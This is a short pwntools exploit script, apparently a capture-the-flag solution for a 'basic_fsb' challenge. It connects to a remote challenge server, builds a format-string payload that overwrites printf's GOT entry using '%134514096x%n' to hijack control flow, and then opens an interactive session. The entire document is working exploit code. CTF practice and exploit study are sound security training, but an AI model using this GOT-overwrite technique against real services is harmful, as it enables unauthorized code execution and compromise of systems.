from pwn import *

context.log_level='debug'
p = remote('ctf.j0n9hyun.xyz', 3002)
e = ELF("./basic_fsb")

payload = p32(e.got["printf"])
payload += b"%134514096x%n"

p.recvuntil(": ")
p.sendline(payload)
p.interactive()
